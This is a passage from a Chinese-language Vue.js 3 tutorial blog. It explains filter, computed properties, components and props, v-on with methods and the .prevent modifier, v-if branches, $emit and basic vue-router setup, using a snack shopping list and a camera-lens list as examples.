class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>元素中v-show属性的值为true就会显示</p><p>filter过滤器接下来讲</p></blockquote><h3 id="filter-过滤器"><a href="#filter-过滤器" class="headerlink" title="filter 过滤器"></a>filter 过滤器</h3><p>作用：过滤，选出自己想要的目标</p><blockquote><p>本例在循环和v-show里均使用了filter</p><p>以循环中的filter为例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in food.filter( item =&gt; item.purchased )&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的filter筛选出了food数组中满足(item.purchased)的值大于0的元素</p></blockquote><h3 id="computed-计算属性"><a href="#computed-计算属性" class="headerlink" title="computed() 计算属性"></a>computed() 计算属性</h3><p>以上这个例子有许多重复的地方</p><p>如：food.filter( item =&gt; item.purchased ) 和 food.filter( item =&gt; ! item.puchased )</p><p>这种重复的东西可以放进计算属性里。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;</span><br><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line"><span class="attr">title</span>: <span class="string">&#x27;零食清单&#x27;</span>,</span><br><span class="line"><span class="attr">food</span>: [</span><br><span class="line">&#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;原味鱿鱼丝&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">&#123;<span class="attr">id</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;辣味鱿鱼丝&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">&#123;<span class="attr">id</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;碳味鱿鱼丝&#x27;</span>, <span class="attr">purchased</span>: <span class="literal">false</span> &#125;,</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line"><span class="title function_">beforeBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">food</span>.<span class="title function_">filter</span>( <span class="function"><span class="params">item</span> =&gt;</span> !item.<span class="property">purchased</span> );</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">afterBuy</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">food</span>.<span class="title function_">filter</span>( <span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">purchased</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span><br></pre></td></tr></table></figure><p>然后，html中换成计算属性中的函数名就行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123; title &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;beforeBuy&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>未购买<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in beforeBuy&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;item.purchased&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.purchased &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">v-show</span>=<span class="string">&quot;afterBuy&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>已购买<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in afterBuy&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item.id&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;item.purchased&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123; item.purchased &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="组件、拆组件和引用组件"><a href="#组件、拆组件和引用组件" class="headerlink" title="组件、拆组件和引用组件"></a>组件、拆组件和引用组件</h2><p>先来看一下createApp方法的本体</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(&#123;<span class="title function_">data</span>(<span class="params"></span>)&#123;&#125;,<span class="attr">computed</span>:&#123;&#125;,template&#125;)</span><br></pre></td></tr></table></figure><p>了解了data()函数、computed属性之后，还有一个template属性。</p><blockquote><p>template：模板</p><p>简单来说，template里就是用来放html的</p><p>因为vue会把实例挂载到dom节点上，所以不用在dom节点内写html。</p><p>可以直接在template上写html，然后把内容挂到dom上。</p></blockquote><p>这时候，就不用多次书写html，而是用vue一对多地挂载上去。</p><p>而当挂在的内容越来越多，页面就会越来越乱。这时候就需要引出vue的一个概念——组件。</p><h3 id="创建和使用组件的步骤如下"><a href="#创建和使用组件的步骤如下" class="headerlink" title="创建和使用组件的步骤如下"></a>创建和使用组件的步骤如下</h3><h4 id="1、在项目目录创建一个名为components的文件夹"><a href="#1、在项目目录创建一个名为components的文件夹" class="headerlink" title="1、在项目目录创建一个名为components的文件夹"></a>1、在项目目录创建一个名为components的文件夹</h4><blockquote><p>这个文件夹用来存放接下来创建的组件</p></blockquote><h4 id="2、在components文件夹中新建一个App-js文件用来存放组件"><a href="#2、在components文件夹中新建一个App-js文件用来存放组件" class="headerlink" title="2、在components文件夹中新建一个App.js文件用来存放组件"></a>2、在components文件夹中新建一个App.js文件用来存放组件</h4><blockquote><ul><li><p>一个组件就是一个文件</p></li><li><p>单文件组件</p></li></ul></blockquote><h4 id="3、App-js-需要使用export语句导出为一个组件对象，便于在其他地方import引入"><a href="#3、App-js-需要使用export语句导出为一个组件对象，便于在其他地方import引入" class="headerlink" title="3、App.js 需要使用export语句导出为一个组件对象，便于在其他地方import引入"></a>3、App.js 需要使用export语句导出为一个组件对象，便于在其他地方import引入</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line"><span class="attr">template</span>: <span class="string">``</span>,</span><br><span class="line"><span class="title function_">data</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line"><span class="attr">computed</span>: &#123;&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、在html中引入根组件"><a href="#4、在html中引入根组件" class="headerlink" title="4、在html中引入根组件:"></a>4、在html中引入根组件:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./components/App.js&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将引入的对象App作为参数，传入createApp()方法中，此时vue会根据App创建一个实例，并挂载到dom中</p><h4 id="5、在组件中引入组件"><a href="#5、在组件中引入组件" class="headerlink" title="5、在组件中引入组件"></a>5、在组件中引入组件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">AppSections</span> <span class="keyword">from</span> <span class="string">&quot;./AppSection.js&quot;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"><span class="attr">components</span>: &#123; <span class="title class_">AppSections</span> &#125;,</span><br><span class="line"><span class="attr">template</span>: <span class="comment">/*html*/</span><span class="string">`</span></span><br><span class="line"><span class="string">&lt;app-sections&gt;&lt;/app-sections&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>要在组件中引入一个AppSection组件作为子组件，首先需要导入AppSection。</li></ul><p>随后按照惯例，写好导出部分export{…}，然后再在里面的cmponents属性里写上import的组件实例名，最后在template属性（模板属性）里自定义的位置加上组件的对应标签（如第5行，下面会讲）。</p><ul><li><p>components是一个和data()、computed、template同级的属性，作用是接收一个组件对象。</p></li><li><p>如第3行，这里的componets属性接收了一个AppSections对象。</p></li><li><p>如第5行，这是将引入的组件嵌入到本组件的方法。组件和标签的名字是一一对应的。若组件名为 AAA ，那么标签名就是<AAA></AAA></p></li></ul><blockquote><p><strong>注意</strong>：html默认不区分大小写，所以尤大大不采用驼峰命名法作为标签名</p><p><strong>所以</strong>：形如“AppSection”对应的标签名为 <app-section></app-section></p></blockquote><h4 id="6、props传值"><a href="#6、props传值" class="headerlink" title="6、props传值"></a>6、props传值</h4><p>prop属性写在子组件里，用来接收父组件传入的值。</p><p>props和template、data()、computed是同级的属性</p><p>也就是说：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(<span class="attr">components</span>:&#123;&#125;,<span class="attr">template</span>:<span class="string">``</span>,<span class="attr">computed</span>:&#123;&#125;,props&#123;&#125;)</span><br></pre></td></tr></table></figure><p>以下是一个使用了props的组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"><span class="attr">template</span>: <span class="comment">/*html*/</span><span class="string">`</span></span><br><span class="line"><span class="string">&lt;section v-show=&quot;buylist.length&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;&#123;&#123; headline &#125;&#125;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">&lt;li v-for=&quot;len in buylist&quot; :key=&quot;len.id&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;h5&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;checkbox&quot; v-model=&quot;len.purchased&quot;&gt;</span></span><br><span class="line"><span class="string">&#123;&#123;len.id&#125;&#125; &#123;&#123;len.name&#125;&#125;  prices: &#123;&#123;len.prices&#125;&#125;</span></span><br><span class="line"><span class="string">&lt;/h5&gt;</span></span><br><span class="line"><span class="string">&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/section&gt;</span></span><br><span class="line"><span class="string">`</span>,</span><br><span class="line"><span class="attr">props</span>: &#123;</span><br><span class="line"><span class="attr">headline</span>: <span class="title class_">String</span>,</span><br><span class="line"><span class="attr">buylist</span>: <span class="title class_">Object</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>props的写法如15-18行。需要注意的是props大括号里元素的值应该是元素的类型。既然表示类型，那么必须要<strong>记住首字母大写</strong>。</p><p>在子组件中 props的元素用插值表达式或数据绑定的形式将props的值插入到template模板中。</p><p>父组件运用含props传值组件的写法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">template</span>: <span class="comment">/*html*/</span><span class="string">`</span></span><br><span class="line"><span class="string">&lt;list-child headline=&quot;未购买&quot; :buylist=&quot;filters.beforeBuy&quot;&gt;&lt;/list-child&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;list-child headline=&quot;已购买&quot; :buylist=&quot;filters.afterBuy&quot;&gt;&lt;/list-child&gt;</span></span><br><span class="line"><span class="string">`</span>,</span><br></pre></td></tr></table></figure><p>在<list-child></list-child>标签中添加名字与子组件中props元素同名的属性。<strong>记得使用数据绑定。</strong></p><hr><h2 id="v-on、methods、v-if、style和class绑定"><a href="#v-on、methods、v-if、style和class绑定" class="headerlink" title="v-on、methods、v-if、style和class绑定"></a>v-on、methods、v-if、style和class绑定</h2><h3 id="v-on-监听事件"><a href="#v-on-监听事件" class="headerlink" title="v-on 监听事件"></a>v-on 监听事件</h3><p>我们可以在需要监听的元素上添加v-on，然后用冒号接上事件的名字</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot; &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>像 v-bind 一样 这种常用的东西都会有缩写——@</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">:click</span>=<span class="string">&quot; &quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="methods-属性"><a href="#methods-属性" class="headerlink" title="methods 属性"></a>methods 属性</h3><p>里面放可以调用的方法，和computed等同级的一个属性。</p><p>也就是说</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">createApp</span>(template,<span class="title function_">data</span>(),computed,props,methods)</span><br></pre></td></tr></table></figure><blockquote><p>methods写法格式的一个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line"><span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">lens</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line"><span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">lens</span>.<span class="property">length</span> + <span class="number">1</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="attr">prices</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"><span class="attr">purchased</span>: <span class="literal">false</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h3 id="v-on-配合-methods属性使用"><a href="#v-on-配合-methods属性使用" class="headerlink" title="v-on 配合 methods属性使用"></a>v-on 配合 methods属性使用</h3><p>例：</p><p>在template属性中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入想买的镜头...&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>methods属性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">add</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">lens</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">            <span class="attr">id</span>: <span class="variable language_">this</span>.<span class="property">lens</span>.<span class="property">length</span> + <span class="number">1</span>,</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="attr">prices</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="attr">purchased</span>: <span class="literal">false</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>然而这样点击了form中的按钮后，网页会默认刷新 导致lens数组里面没有添加东西</p></blockquote><h3 id="prevent-事件修饰符"><a href="#prevent-事件修饰符" class="headerlink" title=".prevent 事件修饰符"></a>.prevent 事件修饰符</h3><blockquote><p>prevent ——-等于javascript的event.preventDefault () 作用：阻止默认程序的运行 </p></blockquote><p>[(23条消息) vue-事件修饰符-详解（.prevent .stop .once .capture .self）_Ace-Liang的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_43873005/article/details/89501985#:~:text=vue-%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6-%E8%AF%A6%E8%A7%A3%EF%BC%88.prevent">https://blog.csdn.net/weixin_43873005/article/details/89501985#:~:text=vue-事件修饰符-详解（.prevent</a> .stop .once .capture .self） 1 .prevent ——-等于javascript的event.preventDefault,但是不会阻止冒泡 ！ … 5 .once 顾名思义， 事件只会触发一次 )</p><p>这里的作用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>=<span class="string">&quot;add&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入想买的镜头...&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一行在 v-on:submit后面加上了.prevent 阻止了默认的刷新</p><h3 id="v-if、v-else-if、v-else"><a href="#v-if、v-else-if、v-else" class="headerlink" title="v-if、v-else-if、v-else"></a>v-if、v-else-if、v-else</h3><p>和 if、else if、else一样，起到一个分支语句的作用</p><p>和 if( ) 一样 判断传入的值是 true 或 false，true就显示元素，false就跳到下一个条件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-if</span>=<span class="string">&quot;lens.length &lt;= 3&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-else-if</span>=<span class="string">&quot;lens.length &gt; 3 &amp;&amp; lens.length &lt;=5&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>再加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">v-else</span>=<span class="string">&quot;lens.length &gt; 5&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>狠狠加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="emit-方法"><a href="#emit-方法" class="headerlink" title="$emit()方法"></a>$emit()方法</h2><p>作用：向父组件暴露本组件内触发的事件</p><p>如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">votefor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">count</span> = <span class="variable language_">this</span>.<span class="property">count</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.$emit(<span class="string">&#x27;votefor&#x27;</span>, <span class="variable language_">this</span>.<span class="property">item</span>.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，当子组件内触发votefor() 方法时，父组件也能监听到这个方法。</p><p>若父组件使用v-on监听子组件暴露的事件，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">vote-item</span> <span class="attr">:item</span>=<span class="string">&quot;item&quot;</span> @<span class="attr">votefor</span>=<span class="string">&quot;voteRecord&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">vote-item</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么，父组件在监听到子组件votefor事件时，会调用自己的voteRecord方法。</p><p>此时，子组件$emit()方法内的第二个参数将成为参数传入到父组件所调用方法内作为参数。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">voteRecord</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">records</span>.<span class="title function_">unshift</span>(&#123;<span class="attr">name</span>: name, <span class="attr">time</span>: <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toLocaleString</span>()&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：父组件的voteRecord()方法是一个有参数的方法，参数为name。那么子组件传递过来的“this.item.name”将传入父组件方法中的“name”。</p><h2 id="vue路由"><a href="#vue路由" class="headerlink" title="vue路由"></a>vue路由</h2><p>vue-router没有被集成到vue.js内。</p><p>所以，要使用vue路由，需要在项目文件夹中执行npm命令安装vue路由：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-router@<span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="引入createRouter函数"><a href="#引入createRouter函数" class="headerlink" title="引入createRouter函数"></a>引入createRouter函数</h3><p>在main.js文件中引入createRouter函数（第2行）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createRouter &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./style.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>createRouter：字面意思就是创建路由</p><p>你可以发现createRouter和createApp函数如此相似，因此这个函数也是创建一个对象，对象里会有属性。</p></blockquote><p>为方便后续使用，创建一个变量router来保存路由实例。</p><h3 id="routes属性"><a href="#routes属性" class="headerlink" title="routes属性"></a>routes属性</h3><p>routes是路由对象里的一个属性，属性值接收一个数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(</span><br><span class="line">    &#123;</span><br><span class="line"><span class="attr">routes</span>: []        </span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="history属性"><a href="#history属性" class="headerlink" title="history属性"></a>history属性</h3><p>history属性用于存放历史规则（第3行）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHistory &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(</span><br><span class="line">    &#123;</span><br><span class="line"><span class="attr">history</span>: <span class="title function_">createWebHistory</span>(),</span><br><span class="line"><span class="attr">routes</span>: [</span><br><span class="line">&#123;<span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Home</span> &#125;,</span><br><span class="line">&#123;<span class="attr">path</span>: <span class="string">&#x27;/chicken-egg&#x27;</span>, <span class="attr">component</span>: <span class="title class_">ChickenEgg</span> &#125;</span><br><span class="line">]        